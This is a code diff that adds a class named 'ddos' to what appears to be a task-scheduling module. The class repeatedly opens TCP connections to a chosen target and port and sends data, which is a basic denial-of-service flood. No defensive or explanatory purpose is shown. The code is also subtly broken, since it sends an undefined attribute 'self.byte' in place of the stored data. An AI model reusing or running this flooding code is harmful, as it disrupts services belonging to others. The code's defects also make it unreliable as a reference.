@@ -61,6 +61,23 @@ class ScheduleManagement:
                 schedule.run_pending()
         except:
             self.listOfSchedules.pop(self.command)
+
+class ddos:
+    def __init__(self,target,port,data,howmany):
+        self.target  = target
+        self.port    = port
+        self.data    = data 
+        self.howmany = howmany
+
+    
+    def attack(self):
+        for i in range(0,self.howmany):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.target, self.port))
+            s.sendto(
+                (self.byte), (self.target, self.port)
+            )
+            s.close()
             
 
 
